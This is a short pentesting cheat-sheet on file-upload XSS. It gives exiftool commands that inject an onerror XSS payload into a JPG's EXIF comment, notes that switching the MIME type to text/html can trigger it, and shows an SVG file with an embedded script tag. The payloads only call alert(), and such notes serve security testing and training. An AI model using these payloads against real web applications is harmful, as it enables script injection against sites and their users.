#### Command line tool used to edit and view exif meta tags
---

https://exiftool.org/install.html

First create a `.jpg` template:
```shell
convert -size 32x32 xc:blue xss.jpg
```

If upload metadata is displayed, the following can be used as a #XSS payload:

```shell
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' xss.jpg
exiftool xss.jpg
```

 If we change the image's MIME-Type to `text/html`, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

---

XSS attacks can also be carried with `SVG` images, along with several other attacks. `Scalable Vector Graphics (SVG)` images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to `xxs.svg`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
```

